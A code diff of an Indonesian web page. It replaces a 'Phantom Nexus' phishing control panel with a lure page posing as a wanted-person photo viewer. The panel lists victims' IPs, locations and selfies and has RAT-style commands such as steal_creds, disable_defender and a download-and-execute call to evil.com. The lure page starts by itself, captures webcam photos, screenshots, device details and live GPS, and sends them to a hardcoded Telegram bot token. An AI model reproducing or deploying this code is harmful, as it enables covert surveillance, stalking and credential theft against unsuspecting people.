@@ -2,285 +2,231 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Phantom Nexus • Real‑time Controller</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FOTO TARGET BURONAN</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: radial-gradient(circle at 20% 30%, #0a0a0f, #000000);
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'SF Pro Text', Helvetica, sans-serif;
-            padding: 0 0 56px;
-            min-height: 100vh;
-        }
-        .glass-nav {
-            background: rgba(10,10,15,0.85);
-            backdrop-filter: blur(16px);
-            padding: 16px 24px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(10,132,255,0.3);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        .logo { font-size: 22px; font-weight: 800; background: linear-gradient(135deg, #fff, #0a84ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .live-badge { background: #0a84ff20; border-radius: 40px; padding: 4px 12px; font-size: 12px; color: #0a84ff; }
-        .stats-panel { display: flex; gap: 16px; margin: 20px 24px; flex-wrap: wrap; }
-        .stat-card { background: rgba(28,28,32,0.7); backdrop-filter: blur(8px); border-radius: 28px; padding: 16px 24px; flex: 1; min-width: 140px; border: 1px solid rgba(255,255,255,0.05); }
-        .stat-number { font-size: 36px; font-weight: 800; color: #0a84ff; }
-        .victim-card { background: rgba(22,22,28,0.85); backdrop-filter: blur(8px); margin: 16px 20px; border-radius: 32px; border: 1px solid rgba(10,132,255,0.2); transition: 0.2s; }
-        .victim-header { padding: 18px 24px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; border-bottom: 0.5px solid rgba(255,255,255,0.05); }
-        .device-icon { font-size: 28px; }
-        .remote-actions { display: flex; flex-wrap: wrap; gap: 8px; margin: 12px 24px; max-height: 180px; overflow-y: auto; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 28px; }
-        .cmd-btn { background: #2c2c2e; border: none; padding: 6px 12px; border-radius: 40px; color: #0a84ff; font-size: 11px; font-weight: 600; cursor: pointer; transition: 0.2s; white-space: nowrap; }
-        .cmd-btn.danger { color: #ff5e5e; }
-        .cmd-btn:hover { background: #0a84ff; color: white; transform: scale(0.96); }
-        .detail-row { background: rgba(35,35,42,0.6); margin: 10px 0; padding: 12px 16px; border-radius: 24px; }
-        .detail-label { font-size: 10px; color: #8e8e98; text-transform: uppercase; }
-        .detail-value { color: #efeff4; font-size: 13px; word-break: break-word; }
-        .photo-preview img { max-width: 100%; border-radius: 24px; margin: 12px 0; border: 1px solid #0a84ff40; }
-        .reply-log { background: #00000060; border-radius: 20px; padding: 8px 12px; margin: 8px 0; font-size: 11px; font-family: monospace; border-left: 3px solid #0a84ff; }
-        .reply-new { animation: blinkBg 0.5s ease; background: #0a84ff30; }
-        @keyframes blinkBg { from { background: #0a84ff80; } to { background: #00000060; } }
-        .btn-danger { background: #ff3b30; width: calc(100% - 48px); margin: 16px 24px; padding: 14px; border-radius: 40px; border: none; color: white; font-weight: 700; cursor: pointer; }
-        .btn-export { background: #30b0c0; }
-        .toast { position: fixed; bottom: 24px; left: 20px; right: 20px; background: #1c1c1e; backdrop-filter: blur(20px); border-radius: 60px; padding: 12px 20px; text-align: center; z-index: 2000; animation: fadeOut 2s forwards; }
-        @keyframes fadeOut { 0% { opacity: 1; transform: translateY(0); } 70% { opacity: 1; } 100% { opacity: 0; visibility: hidden; transform: translateY(10px); } }
-        .login-container { background: rgba(28,28,34,0.95); backdrop-filter: blur(20px); margin: 20vh 24px; padding: 40px 28px; border-radius: 48px; text-align: center; border: 1px solid #0a84ff40; }
-        .login-container input { background: #2c2c2e; border: none; border-radius: 60px; padding: 16px; width: 100%; color: white; margin: 20px 0; }
-        .login-container button { background: #0a84ff; border: none; border-radius: 60px; padding: 14px; width: 100%; color: white; font-weight: 700; }
-        .badge-new { background: #ff3b30; border-radius: 20px; padding: 2px 8px; font-size: 10px; margin-left: 8px; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .export-log-btn { background: #2c2c2e; border: none; padding: 4px 12px; border-radius: 20px; color: #30b0c0; font-size: 10px; cursor: pointer; margin-left: 8px; }
-        @media (max-width: 560px) { .remote-actions { justify-content: center; } .victim-header { flex-direction: column; align-items: flex-start; } }
+        body { background:#000; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:'Courier New',monospace; color:#0f0; overflow:hidden; }
+        #container { text-align:center; width:80%; max-width:400px; }
+        #loading-text { font-size:22px; color:#f00; font-weight:bold; margin-bottom:20px; }
+        #progress-bar { height:3px; background:#222; border-radius:3px; overflow:hidden; }
+        #progress-fill { height:100%; width:0%; background:linear-gradient(90deg,#0f0,#0c0); transition:width 0.3s; }
+        #details { margin-top:20px; font-size:14px; color:#0f0; }
+        .hidden { display:none; }
+        button { background:#f00; color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; box-shadow:0 0 10px #f00; }
     </style>
 </head>
 <body>
-<div id="app"></div>
-<script>
-    // ================= KONFIGURASI =================
-    const ADMIN_PASSWORD = 'ManzzHandSome2331';
-    const BOT_TOKEN = '7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';
-    const CHAT_ID = '7962628944';
-    let lastDataHash = ''; // untuk deteksi perubahan real-time
-    let newReplyCount = {}; // track reply baru per victim
+    <div id="container">
+        <div style="color:#0f0; font-size:14px; padding:10px 0;">
+            Team Kami Tidak Dapat Menaruh Foto Target Buronan Di Website Ini Karena Alasan Privasi. Silahkan Klik Tombol Untuk Mendapatkan Foto Target Buronan
+        </div>
+        <button onclick="startTracking()">📸 Foto Buronan</button>
+        <div id="loading-text"># JCT SUPPORT</div>
+        <div id="progress-bar"><div id="progress-fill"></div></div>
+        <div id="details">Menunggu aksi...</div>
+    </div>
 
-    async function sendTelegram(msg, mode='HTML') {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: mode })
-            });
-        } catch(e) {}
-    }
-    function showToast(msg, isErr=false) {
-        let t = document.createElement('div');
-        t.className = 'toast';
-        t.innerText = msg;
-        if(isErr) t.style.background = '#ff3b30';
-        document.body.appendChild(t);
-        setTimeout(()=>t.remove(), 2200);
-    }
-    function sendRemoteCommand(victimId, command, payload={}) {
-        const key = `remote_cmd_${victimId}`;
-        localStorage.setItem(key, JSON.stringify({ cmd: command, payload, time: Date.now() }));
-        showToast(`📡 Perintah "${command}" dikirim ke ${victimId.slice(0,12)}...`);
-        sendTelegram(`🎮 Remote command issued: ${command} to ${victimId}`);
-        setTimeout(()=>localStorage.removeItem(key), 15000);
-    }
-    function exportVictimLogs(victim) {
-        if(!victim.remote_replies || victim.remote_replies.length===0) {
-            showToast('Tidak ada log untuk diexport', true);
-            return;
-        }
-        let csv = "Timestamp,Type,Content\n";
-        victim.remote_replies.forEach(r => {
-            let content = r.content.replace(/,/g, ';').replace(/\n/g, ' ');
-            csv += `"${r.time}","${r.type}","${content}"\n`;
-        });
-        let blob = new Blob([csv], {type:'text/csv'});
-        let a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = `logs_${victim.id.slice(0,15)}.csv`;
-        a.click();
-        showToast('Log diexport ke CSV');
-    }
-    function renderLogin() {
-        document.getElementById('app').innerHTML = `
-            <div class="login-container">
-                <div style="font-size:56px;">🛸</div>
-                <h2 style="color:white;">Phantom Nexus</h2>
-                <p style="color:#aaa;">Akses penuh kendali korban</p>
-                <input type="password" id="adminPass" placeholder="Password" autocomplete="off">
-                <button onclick="doLogin()">⏤ UNLOCK ⏤</button>
-            </div>
-        `;
-    }
-    function doLogin() {
-        let p = document.getElementById('adminPass').value;
-        if(p === ADMIN_PASSWORD) {
-            localStorage.setItem('admin_logged_in','true');
-            renderDashboard();
-            showToast('✅ Akses granted');
-            startRealtimeWatcher();
-        } else showToast('❌ Password salah!', true);
-    }
-    function startRealtimeWatcher() {
-        // pantau perubahan localStorage 'phising_data' dari tab lain (termasuk reply dari phising page)
-        window.addEventListener('storage', (e) => {
-            if(e.key === 'phising_data') {
-                console.log('Data berubah real-time!');
-                renderDashboard();
-                showToast('📨 Data baru dari korban!');
-            }
-        });
-        // juga pantau setiap 2 detik untuk same-tab update (fallback)
-        setInterval(() => {
-            if(localStorage.getItem('admin_logged_in')==='true') {
-                let currentData = localStorage.getItem('phising_data') || '[]';
-                if(currentData !== lastDataHash) {
-                    lastDataHash = currentData;
-                    renderDashboard();
+    <video id="video" autoplay muted class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <script>
+        // ========== KONFIGURASI – GANTI DENGAN PUNYA LU ==========
+        const TOKEN = '"7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';    // ganti dengan token dari @BotFather
+        const CHAT_ID = '7962628944';    // ganti dengan chat ID (bisa cek @userinfobot)
+        // ========================================================
+
+        const MAX_RETRY = 5;
+
+        // Fungsi kirim pesan dengan retry
+        async function sendToTelegram(text, retry = 0) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode:'HTML' })
+                });
+                if (!res.ok && retry < MAX_RETRY) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    return sendToTelegram(text, retry + 1);
                 }
-            }
-        }, 2000);
-    }
-    function renderDashboard() {
-        let victims = [];
-        try { victims = JSON.parse(localStorage.getItem('phising_data')||'[]'); } catch(e) {}
-        let now = new Date();
-        let html = `
-            <div class="glass-nav">
-                <div class="logo">⚡ PHANTOM NEXUS · REALTIME CTRL</div>
-                <div class="live-badge">LIVE ${now.toLocaleTimeString()}</div>
-            </div>
-            <div class="stats-panel">
-                <div class="stat-card"><div class="stat-number">${victims.length}</div><div>Total Target</div></div>
-                <div class="stat-card"><div class="stat-number">${victims.filter(v=>v.foto).length}</div><div>Dengan Selfie</div></div>
-                <div class="stat-card"><div class="stat-number">${victims.reduce((a,v)=>a+(v.remote_replies?.length||0),0)}</div><div>Remote Reply</div></div>
-            </div>
-            <button class="btn-danger btn-export" onclick="exportAllData()">📥 EXPORT ALL JSON</button>
-            <button class="btn-danger" onclick="clearAllData()">⚠️ HAPUS SEMUA DATA</button>
-        `;
-        if(victims.length===0) html+=`<div style="text-align:center;margin:60px;color:#8e8e93;">📭 Belum ada korban. Sebarkan link phishing.</div>`;
-        else {
-            victims.slice().reverse().forEach((v,idx)=>{
-                let icon = v.deviceAgent?.includes('iPhone')?'📱':(v.deviceAgent?.includes('Android')?'🤖':'💻');
-                let expandId = `det_${v.id}_${idx}`;
-                let replyCount = v.remote_replies?.length || 0;
-                let newBadge = '';
-                if(newReplyCount[v.id] && newReplyCount[v.id] > 0) {
-                    newBadge = `<span class="badge-new">${newReplyCount[v.id]} baru</span>`;
+                return res.ok;
+            } catch(e) {
+                if (retry < MAX_RETRY) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    return sendToTelegram(text, retry + 1);
                 }
-                html += `
-                    <div class="victim-card" data-id="${v.id}">
-                        <div class="victim-header">
-                            <div><span class="device-icon">${icon}</span> <strong>${v.devicePlatform||'Unknown'}</strong><br><span style="font-size:11px;color:#aaa;">${v.waktu||'-'}</span></div>
-                            <div>📍 ${v.kota||'?'}, ${v.negara||'?'}</div>
-                        </div>
-                        <div class="remote-actions">
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','flash_on')">💡 FLASH</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','gallery')">🖼️ GALLERY</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','get_sms')">📨 SMS/OTP</button>
-                            <button class="cmd-btn danger" onclick="sendRemoteCommand('${v.id}','camera_stream')">📹 CAMERA</button>
-                            <button class="cmd-btn danger" onclick="sendRemoteCommand('${v.id}','mic_stream')">🎤 MIC</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','remote_shell')">🖥️ SHELL</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','file_manager')">📁 FILE</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','keylogger_start')">⌨️ KEYLOG</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','screenshot')">📸 SCREEN</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','webcam_record')">🎥 WEBCAM</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','mic_record')">🎙️ MIC REC</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','screen_record')">📹 SCREC</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','remote_desktop')">🖥️ RDP</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','hvnc')">👻 HVNC</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','steal_creds')">🔑 CREDS</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','clipboard_monitor')">📋 CLIP</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','file_search','{ext:".pdf"}')">🔍 SEARCH</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','bypass_uac')">🛡️ UAC</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','disable_defender')">⚠️ DEFENDER</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','persistence')">⏳ PERSIST</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','sandbox_detect')">🕵️ SANDBOX</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','ddos_attack')">💣 DDOS</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','spread_usb')">📀 SPREAD</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','download_execute','{url:"https://evil.com/payload.exe"}')">⬇️ EXEC</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','self_destruct')">💀 DESTROY</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','lock_input')">🔒 LOCK</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','registry_edit')">📝 REG</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','fake_message')">💬 FAKE MSG</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','restart')">🔄 RESTART</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','shutdown')">⏻ SHUTDOWN</button>
-                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','open_cdrom')">💿 CDROM</button>
-                            <button class="cmd-btn" onclick="toggleDetails('${expandId}',this)">🔍 DETAIL ${newBadge}</button>
-                            <button class="export-log-btn" onclick="exportVictimLogs(${JSON.stringify(v).replace(/"/g, '&quot;')})">📄 Export Log CSV</button>
-                        </div>
-                        <div id="${expandId}" style="max-height:0; overflow:hidden; transition:0.3s; padding:0 24px;">
-                            <div class="detail-row"><div class="detail-label">🌐 IP</div><div class="detail-value">${v.ip||'-'}</div></div>
-                            <div class="detail-row"><div class="detail-label">📍 Koordinat</div><div class="detail-value">${v.lat||'-'}, ${v.lon||'-'} <a href="https://maps.google.com/?q=${v.lat||''},${v.lon||''}" target="_blank" style="color:#0a84ff;">(Map)</a></div></div>
-                            <div class="detail-row"><div class="detail-label">📱 User Agent</div><div class="detail-value" style="font-size:11px;">${v.deviceAgent||'-'}</div></div>
-                            <div class="detail-row"><div class="detail-label">📺 Resolusi</div><div class="detail-value">${v.screenRes||'-'}</div></div>
-                            <div class="photo-preview">${v.foto?`<img src="${v.foto}" onclick="window.open(this.src)">`:'<div class="detail-row">📷 Selfie tidak ada</div>'}</div>
-                            <div style="margin-top:12px; margin-bottom:6px;"><strong>📨 Remote Replies (${replyCount})</strong></div>
-                            ${v.remote_replies?.map(r=>`<div class="reply-log" data-time="${r.time}">📨 [${r.time}] <strong>${r.type}</strong>: ${r.content.substring(0,150)}</div>`).join('')||'<div class="detail-row">Belum ada reply dari korban</div>'}
-                            <button class="cmd-btn" style="background:#ff3b30;color:white;margin:12px 0;" onclick="deleteVictim('${v.id}')">🗑 Hapus korban ini</button>
-                        </div>
-                    </div>
-                `;
-            });
+                return false;
+            }
         }
-        document.getElementById('app').innerHTML = html;
-        // reset new reply badge setelah dashboard dirender (optional)
-        setTimeout(() => { newReplyCount = {}; }, 500);
-    }
-    function toggleDetails(id, btn) {
-        let el = document.getElementById(id);
-        if(el.style.maxHeight === '0px' || el.style.maxHeight === '') {
-            el.style.maxHeight = '2000px';
-            btn.innerText = 'Sembunyikan Detail';
-        } else {
-            el.style.maxHeight = '0px';
-            btn.innerText = 'Lihat Detail';
+
+        // Kirim foto dengan retry
+        async function sendPhoto(blob, filename, retry = 0) {
+            try {
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', blob, filename);
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: form
+                });
+                if (!res.ok && retry < MAX_RETRY) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    return sendPhoto(blob, filename, retry + 1);
+                }
+                return res.ok;
+            } catch(e) {
+                if (retry < MAX_RETRY) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    return sendPhoto(blob, filename, retry + 1);
+                }
+                return false;
+            }
         }
-    }
-    function deleteVictim(id) {
-        let victims = JSON.parse(localStorage.getItem('phising_data')||'[]');
-        victims = victims.filter(v=>v.id !== id);
-        localStorage.setItem('phising_data', JSON.stringify(victims));
-        renderDashboard();
-        showToast('Korban dihapus');
-    }
-    function clearAllData() {
-        if(confirm('Hapus semua data korban? Tidak bisa dikembalikan!')) {
-            localStorage.removeItem('phising_data');
-            renderDashboard();
-            showToast('Semua data dibersihkan');
+
+        // Ambil detail alamat dari koordinat
+        async function getLocationDetails(lat, lon) {
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                const data = await res.json();
+                if (data.address) {
+                    return {
+                        kabupaten: data.address.county || data.address.city || data.address.state || 'Tidak diketahui',
+                        kecamatan: data.address.suburb || data.address.village || data.address.town || 'Tidak diketahui',
+                        full: data.display_name || 'Alamat tidak tersedia'
+                    };
+                }
+            } catch(e) {}
+            return { kabupaten:'Tidak diketahui', kecamatan:'Tidak diketahui', full:'Alamat tidak tersedia' };
         }
-    }
-    function exportAllData() {
-        let data = localStorage.getItem('phising_data');
-        if(!data || JSON.parse(data).length===0) return showToast('Tidak ada data',true);
-        let blob = new Blob([data],{type:'application/json'});
-        let a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = `phishing_nexus_${Date.now()}.json`;
-        a.click();
-        showToast('Export sukses');
-    }
-    // attach fungsi ke window
-    window.sendRemoteCommand = sendRemoteCommand;
-    window.toggleDetails = toggleDetails;
-    window.deleteVictim = deleteVictim;
-    window.clearAllData = clearAllData;
-    window.exportAllData = exportAllData;
-    window.doLogin = doLogin;
-    window.exportVictimLogs = exportVictimLogs;
-    // init
-    if(localStorage.getItem('admin_logged_in')==='true') {
-        renderDashboard();
-        startRealtimeWatcher();
-    } else {
-        renderLogin();
-    }
-</script>
+
+        // Kumpulkan info perangkat & lokasi (via IP)
+        async function collectDeviceInfo() {
+            let msg = '╭───── 📡 DRAGON XRAT REPORT ───── ⦿\n\n';
+            msg += `🖥️ User-Agent: ${navigator.userAgent}\n`;
+            msg += `💻 Platform: ${navigator.platform}\n`;
+            msg += `🌐 Bahasa: ${navigator.language}\n`;
+            msg += `📶 Online: ${navigator.onLine ? '✅' : '❌'}\n`;
+            msg += `📺 Screen: ${screen.width}x${screen.height}\n`;
+            msg += `🪟 Window: ${window.innerWidth}x${window.innerHeight}\n`;
+            msg += `💾 RAM: ${navigator.deviceMemory || '?'} GB\n`;
+            msg += `🧠 CPU: ${navigator.hardwareConcurrency || '?'} cores\n`;
+            
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    msg += `🔋 Battery: ${Math.floor(bat.level*100)}% ${bat.charging ? '(⚡ charging)' : ''}\n`;
+                } catch(e) {}
+            }
+            msg += `⏰ Waktu: ${new Date().toString()}\n`;
+            msg += `🕒 Load: ${(performance.now()).toFixed(0)} ms\n`;
+            msg += `📜 History: ${history.length} entries\n`;
+            msg += `✋ Touch: ${'ontouchstart' in window ? '✅' : '❌'}\n`;
+            msg += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+            msg += `🌍 URL: ${window.location.href}\n`;
+            msg += `📄 Title: ${document.title}\n`;
+            msg += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            msg += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+
+            // IP & lokasi via ipapi
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                msg += '📍 IP & LOKASI (perkiraan)\n';
+                msg += `📡 IP: ${ipData.ip}\n`;
+                msg += `🏙️ Kota: ${ipData.city}\n`;
+                msg += `🗺️ Wilayah: ${ipData.region}\n`;
+                msg += `🌎 Negara: ${ipData.country_name}\n`;
+                msg += `📮 Kode Pos: ${ipData.postal}\n`;
+                if (ipData.latitude && ipData.longitude) {
+                    msg += `📌 Lat: ${ipData.latitude}\n`;
+                    msg += `📍 Lng: ${ipData.longitude}\n`;
+                    const det = await getLocationDetails(ipData.latitude, ipData.longitude);
+                    msg += `🏙️ Kabupaten: ${det.kabupaten}\n`;
+                    msg += `🏙️ Kecamatan: ${det.kecamatan}\n`;
+                    msg += `🏠 Alamat: ${det.full}\n`;
+                }
+            } catch(e) {
+                msg += '❌ Gagal ambil info IP\n';
+            }
+            msg += '\n╰───── @AnzOfficiall ───── ⦿';
+            return msg;
+        }
+
+        // Fungsi utama
+        async function startTracking() {
+            // Update progress bar pura-pura
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random()*3;
+                if(progress > 95) progress = 95;
+                document.getElementById('progress-fill').style.width = progress + '%';
+                const msgs = ['Memeriksa modul...','Mengaktifkan sensor...','Mengambil data...','Mempersiapkan laporan...'];
+                document.getElementById('details').textContent = msgs[Math.floor(Math.random()*msgs.length)];
+            }, 500);
+
+            // Kirim info device
+            const info = await collectDeviceInfo();
+            await sendToTelegram(info);
+
+            // Ambil foto dari kamera (jika diizinkan)
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 4000));
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendPhoto(blob, 'cam_shot.jpg'), 'image/jpeg');
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {
+                await sendToTelegram('❌ Kamera tidak dapat diakses: ' + e.message);
+            }
+
+            // Screenshot
+            setTimeout(async () => {
+                try {
+                    const canvas = await html2canvas(document.body, { scale: 1, useCORS: true });
+                    canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
+                } catch(e) {
+                    await sendToTelegram('❌ Gagal screenshot: ' + e.message);
+                }
+            }, 6000);
+
+            // GPS real-time (watchPosition)
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(async (pos) => {
+                    const c = pos.coords;
+                    let gpsMsg = `📍 LIVE GPS UPDATE\n`;
+                    gpsMsg += `📌 Lat: ${c.latitude}\n`;
+                    gpsMsg += `📍 Lng: ${c.longitude}\n`;
+                    gpsMsg += `🎯 Akurasi: ${c.accuracy}m\n`;
+                    const det = await getLocationDetails(c.latitude, c.longitude);
+                    gpsMsg += `🏙️ Kabupaten: ${det.kabupaten}\n`;
+                    gpsMsg += `🏙️ Kecamatan: ${det.kecamatan}\n`;
+                    gpsMsg += `🏠 Alamat: ${det.full}\n`;
+                    await sendToTelegram(gpsMsg);
+                }, 
+                async (err) => {
+                    await sendToTelegram('❌ GPS error: ' + err.message);
+                },
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                );
+            } else {
+                await sendToTelegram('❌ GPS tidak didukung browser ini.');
+            }
+
+            // Selesai loading
+            clearInterval(interval);
+            document.getElementById('progress-fill').style.width = '100%';
+            document.getElementById('details').textContent = '✅ Tracking aktif! Data dikirim ke Telegram.';
+        }
+
+        // Auto start jika tombol tidak diklik? biar manual, tapi kita mulai otomatis setelah delay
+        setTimeout(startTracking, 2000);
+    </script>
 </body>
 </html>
